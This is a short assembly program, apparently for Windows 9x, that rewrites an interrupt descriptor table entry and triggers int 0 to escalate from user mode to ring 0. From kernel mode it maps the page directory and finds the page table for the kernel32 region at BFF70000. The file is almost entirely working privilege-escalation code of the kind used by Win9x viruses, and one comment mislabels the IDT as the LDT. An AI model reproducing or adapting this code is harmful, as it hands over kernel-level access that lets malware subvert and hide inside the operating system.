
; action: enter ring0 and dump address of the 2nd-level page for BFF70000

callW                   macro   x
                        extern  x:PROC
                        call    x
                        endm

include                 consts.inc

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

msg_1                   db      'address: BFF70000',13,10
                        db      'pagetable second-level page at ',0

result                  dd      ?

                        .code
start:

                        lea     edx, msg_1
                        call    dump_asciiz
                        
                        sidt    [esp-2]                 ; EDI <-- LDT.base
                        pop     edi
                        fild    qword ptr [edi]         ; save desriptor #0
                        add     eax, r0proc-start
                        cld
                        stosd                           ; +0 WORD offs&0xFFFF
                        stosd                           ; +6 WORD offs>>16
                        mov     dword ptr [edi-6], 0EE000028h
                        int     00h                     ; jmp to ring-0

                        mov     eax, result
                        call    dump_hexdword
                        call    dump_crlf

                        push    -1
                        callW   ExitProcess

r0proc:                 fistp   qword ptr [edi-8]         ; restore descr. #0

                        pusha

                        mov     eax, cr3
                        and     eax, not 4095

                        push    0
                        push    4096
                        push    eax
                        VMMcall MapPhysToLinear
                        add     esp,3*4

                        cmp     eax, -1
                        je      __shit

                        mov     eax, [eax+0BFCh] ;(BFF70000 & 0xFFC00000)>>20
                        and     eax, not 4095

                        push    0
                        push    4096
                        push    eax
                        VMMcall MapPhysToLinear
                        add     esp,3*4

                        mov     result, eax

__shit:                 popa
                        iret

include                 console.inc     ; console io

                        end     start
